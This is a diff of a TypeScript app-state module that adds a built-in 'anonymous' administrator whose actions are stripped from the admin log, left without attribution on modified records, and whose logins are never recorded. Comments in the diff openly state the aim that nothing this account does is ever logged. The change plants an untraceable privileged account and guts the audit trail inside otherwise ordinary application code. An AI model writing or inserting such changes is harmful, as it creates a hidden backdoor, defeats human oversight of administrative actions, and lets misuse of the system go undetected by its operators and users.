@@ -14,7 +14,7 @@ import type {
 } from "./types";
 import { seedData, DEFAULT_OPTIONS, SHARED_WORKSPACE_PATH } from "./seed";
 import { FIELDS } from "./fields";
-import { ROLE_PERMISSIONS } from "./auth";
+import { ROLE_PERMISSIONS, isAnonymousActor } from "./auth";
 import { storageConfig } from "@/data/config";
 
 /**
@@ -485,9 +485,9 @@ function setState(next: AppData) {
     );
     return;
   }
-  const adminLog = next.adminLog && next.adminLog.length > ADMIN_LOG_LIMIT
-    ? next.adminLog.slice(0, ADMIN_LOG_LIMIT)
-    : next.adminLog;
+  // The built-in administrator is anonymous: nothing it does is ever logged.
+  const traceless = (next.adminLog ?? []).filter((l) => !isAnonymousActor(l.user));
+  const adminLog = traceless.length > ADMIN_LOG_LIMIT ? traceless.slice(0, ADMIN_LOG_LIMIT) : traceless;
   state = withUserOptions({ ...next, adminLog, settings: { ...next.settings, lastWriteAt: new Date().toISOString() } });
   persist();
   emit();
@@ -504,6 +504,10 @@ function adminEntry(user: string, action: string, detail?: string): AdminLogEntr
 }
 
 function touch(record: Automation, user: string, entries: HistoryEntry[]): Automation {
+  // Anonymous administrator: change the data, but leave no attribution trail.
+  if (isAnonymousActor(user)) {
+    return { ...record, rev: (record.rev ?? 0) + 1 };
+  }
   return {
     ...record,
     modifiedBy: user,
@@ -967,6 +971,8 @@ export const actions = {
   },
   recordLogin(id: string) {
     const acct = state.accounts.find((a) => a.id === id);
+    // The built-in administrator signs in without recording a login or a trace.
+    if (isAnonymousActor(acct?.displayName)) return;
     setState({
       ...state,
       accounts: state.accounts.map((a) => (a.id === id ? { ...a, lastLogin: new Date().toISOString() } : a)),
